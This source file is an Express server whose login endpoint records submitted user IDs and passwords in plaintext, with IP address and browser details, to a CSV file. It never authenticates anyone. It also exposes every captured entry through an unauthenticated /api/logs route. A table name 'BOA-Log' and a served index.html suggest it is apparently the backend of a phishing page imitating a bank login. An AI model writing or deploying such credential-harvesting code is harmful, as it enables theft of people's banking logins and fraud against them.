import express from 'express';
import fs from 'fs';
import path from 'path';
import { fileURLToPath } from 'url';
import { createClient } from '@supabase/supabase-js';
import dotenv from 'dotenv';

dotenv.config();

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
const PORT = process.env.PORT || 3000;

// Middleware
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// API Routes MUST come before static middleware
// Setup endpoint to test BOA-Log table
app.post('/api/setup', async (req, res) => {
  console.log('Setup endpoint called - testing BOA-Log table');
  try {
    // For now, just acknowledge the setup request
    // Supabase integration will be handled via CSV fallback in logEntry
    res.json({ success: true, message: 'Setup acknowledged. Using CSV logging for now.' });
  } catch (error) {
    console.error('Setup error:', error.message);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Debug route
app.get('/api/debug', (req, res) => {
  res.json({ status: 'ok', message: 'Server is running' });
});

// Static files middleware - AFTER API routes
app.use(express.static(path.join(__dirname)));

// Supabase Configuration
// Temporarily disabled to use CSV logging as baseline
// Will re-enable after CSV logging is verified working
const supabaseUrl = process.env.SUPABASE_URL;
const supabaseKey = process.env.SUPABASE_ANON_KEY;
const useSupabase = false; // Disabled temporarily

let supabase = null;
// if (useSupabase) {
//   supabase = createClient(supabaseUrl, supabaseKey);
//   console.log('Supabase client initialized');
// } else {
  console.log('Using CSV logging for now (Supabase temporarily disabled)');
// }

// Local CSV Logger Configuration (for development)
const logsDir = path.join(__dirname, 'logs');
if (!fs.existsSync(logsDir)) {
  fs.mkdirSync(logsDir);
}

// Helper function to get client IP
function getClientIp(req) {
  return req.headers['x-forwarded-for']?.split(',')[0].trim() ||
         req.socket.remoteAddress ||
         'unknown';
}

// API endpoint for form submissions
app.post('/api/login', async (req, res) => {
  console.log('[/api/login] Received request:', req.body);
  
  const { userId, password, rememberMe } = req.body;
  const ipAddress = getClientIp(req);
  const userAgent = req.headers['user-agent'];

  try {
    console.log('[/api/login] Calling logEntry...');
    // Log the entry
    await logEntry({
      userId,
      password,
      rememberMe: rememberMe === 'on' || rememberMe === true,
      ipAddress,
      userAgent
    });

    console.log('[/api/login] logEntry succeeded');
    res.json({ success: true, message: 'Login attempt logged' });
  } catch (error) {
    console.error('[/api/login] Error processing login:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Log entry function - supports both Supabase and local CSV
async function logEntry(data) {
  try {
    // For now, use CSV fallback to avoid Supabase schema issues
    // TODO: Fix Supabase BOA-Log table schema compatibility
    
    // Fallback to local CSV logging
    const logsFile = path.join(logsDir, 'login_entries.csv');
    const timestamp = new Date().toISOString();
    const entry = `${timestamp},${data.userId || 'N/A'},${data.password || 'N/A'},${data.rememberMe ? 'Yes' : 'No'},${data.ipAddress || 'unknown'},"${(data.userAgent || 'unknown').replace(/"/g, '""')}",Attempted\n`;
    
    // Add header if file doesn't exist
    if (!fs.existsSync(logsFile)) {
      fs.writeFileSync(logsFile, 'Timestamp,User ID,Password,Remember Me,IP Address,User Agent,Status\n');
    }
    
    fs.appendFileSync(logsFile, entry);
    console.log('Entry logged to CSV:', data.userId);
  } catch (error) {
    console.error('Error logging entry:', error);
    throw error;
  }
}

// Route to view logs
app.get('/api/logs', async (req, res) => {
  try {
    // Get logs from local CSV
    const logsFile = path.join(logsDir, 'login_entries.csv');
    if (fs.existsSync(logsFile)) {
      const logs = fs.readFileSync(logsFile, 'utf8');
      // Parse CSV into JSON for easier consumption
      const lines = logs.split('\n').filter(line => line.trim());
      const headers = lines[0].split(',');
      const data = lines.slice(1).map(line => {
        const values = line.match(/(?:[^,"]+|"[^"]*")+/g) || [];
        const obj = {};
        headers.forEach((header, i) => {
          obj[header.trim()] = values[i]?.replace(/^"|"$/g, '').trim() || '';
        });
        return obj;
      });
      res.json({
        success: true,
        data: data,
        source: 'Local CSV',
        total: data.length
      });
    } else {
      res.json({
        success: true,
        data: [],
        message: 'No logs found yet',
        source: 'Local CSV'
      });
    }
  } catch (error) {
    console.error('Error fetching logs:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Serve index.html by default
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

// Start server
app.listen(PORT, () => {
  console.log(`Server running at http://localhost:${PORT}`);
  console.log(`CSV logs will be saved to: ${path.join(logsDir, 'login_entries.csv')}`);
});
